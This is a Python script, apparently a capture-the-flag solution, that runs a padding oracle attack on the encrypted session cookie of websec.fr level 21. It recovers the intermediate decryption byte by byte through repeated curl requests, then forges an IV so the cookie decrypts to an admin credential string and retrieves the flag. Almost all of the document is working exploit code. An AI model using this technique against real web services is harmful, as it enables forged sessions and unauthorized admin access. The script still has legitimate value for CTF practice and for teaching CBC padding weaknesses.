#!/usr/bin/env python3
import binascii
import subprocess
import sys
import time

request_count = 0

def oracle_test(cookie_hex):
    global request_count
    request_count += 1
    
    # SIN TIMEOUT - dejamos que vaya a su velocidad natural
    cmd = f'curl -s https://websec.fr/level21/index.php --cookie "session={cookie_hex}"'
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    return "corrupted" not in result.stdout.lower()

def decrypt_intermediate(ct_hex):
    """Descifra el valor intermedio D(K, CT)"""
    intermediate = bytearray(16)
    
    print("Descifrando valor intermedio D(K, CT)...\n")
    
    for pad_val in range(1, 17):
        pos = 16 - pad_val
        print(f"  Byte {pos} (pad {pad_val:2d})...", end='', flush=True)
        
        found = False
        for guess in range(256):
            test_iv = bytearray(16)
            
            # Setear bytes ya conocidos
            for k in range(1, pad_val):
                test_iv[16 - k] = intermediate[16 - k] ^ pad_val
            
            test_iv[pos] = guess
            
            test_cookie = binascii.hexlify(test_iv).decode() + ct_hex
            
            if oracle_test(test_cookie):
                intermediate[pos] = guess ^ pad_val
                char_repr = chr(intermediate[pos]) if 32 <= intermediate[pos] < 127 else '?'
                print(f" 0x{intermediate[pos]:02x} ('{char_repr}') - {request_count} reqs")
                found = True
                break
        
        if not found:
            print(f" FAILED")
            return None
    
    return bytes(intermediate)

# Cookie de testxx truncada
cookie = "3d2d8bf19f0ce326f736a1443b952355b1fad1874477f658622708ae3c2b008c"

ct_hex = cookie[32:64]  # Primer bloque del CT

print("=== PADDING ORACLE ATTACK SIN TIMEOUTS ===\n")
print(f"CT a descifrar: {ct_hex}\n")

start = time.time()

intermediate = decrypt_intermediate(ct_hex)

elapsed = time.time() - start

if intermediate:
    print(f"\n✓ Intermedio descifrado: {binascii.hexlify(intermediate).decode()}")
    print(f"  Requests totales: {request_count}")
    print(f"  Tiempo: {elapsed:.1f}s ({elapsed/request_count:.2f}s por request)")
    
    # Ahora calcular IV para "user/pass:admin/"
    target = b"user/pass:admin/"
    if len(target) < 16:
        target = target + b'\x00' * (16 - len(target))
    
    iv_needed = bytearray(16)
    for i in range(16):
        iv_needed[i] = intermediate[i] ^ target[i]
    
    print(f"\n  IV necesario: {binascii.hexlify(iv_needed).decode()}")
    
    # Construir cookie final
    cookie_final = binascii.hexlify(iv_needed).decode() + ct_hex
    
    print(f"\n  Cookie final: {cookie_final}")
    print(f"\n  Probando...")
    
    cmd = f'curl -s https://websec.fr/level21/index.php --cookie "session={cookie_final}"'
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    
    import re
    flag_match = re.search(r'WEBSEC\{[^}]+\}', result.stdout)
    if flag_match:
        print(f"\n★★★★★ FLAG: {flag_match.group(0)} ★★★★★")
    elif "Hello admin" in result.stdout:
        print(f"\n★★★ Hello admin encontrado! Buscando flag...")
        for line in result.stdout.split('\n'):
            if 'flag' in line.lower() or 'WEBSEC' in line:
                print(line.strip())
    else:
        print(f"\n  Status: {'Wrong' if 'Wrong' in result.stdout else 'Otro'}")
else:
    print(f"\n✗ Fallo al descifrar")
    print(f"  Requests: {request_count}, Tiempo: {elapsed:.1f}s")

